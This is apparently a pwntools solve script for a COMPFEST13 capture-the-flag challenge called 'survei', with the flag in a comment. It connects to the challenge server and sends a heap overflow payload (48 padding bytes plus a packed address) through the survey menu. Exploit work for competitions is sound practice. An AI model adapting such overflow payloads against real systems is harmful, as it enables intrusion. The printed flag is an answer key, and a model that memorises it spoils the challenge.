import struct
from pwn import *

# Flag : COMPFEST13{N0wY0U_knoW_heapOv3rflow}

idx_last = 48

#elf = ELF("./survei")
#prog = elf.process()

prog = remote('103.152.242.242', 30148)

# Isi survei
print(prog.recv().decode())
prog.sendline("1")
print(prog.recv().decode())
prog.sendline("0")
print(prog.recv().decode())
prog.sendline(b"A"*idx_last + struct.pack("<I", 0x6010e0))
print(prog.recv().decode())

# Lihat survei
print(prog.recv().decode())
prog.sendline("2")
print(prog.recv().decode())
prog.sendline("1")
print(prog.recv().decode())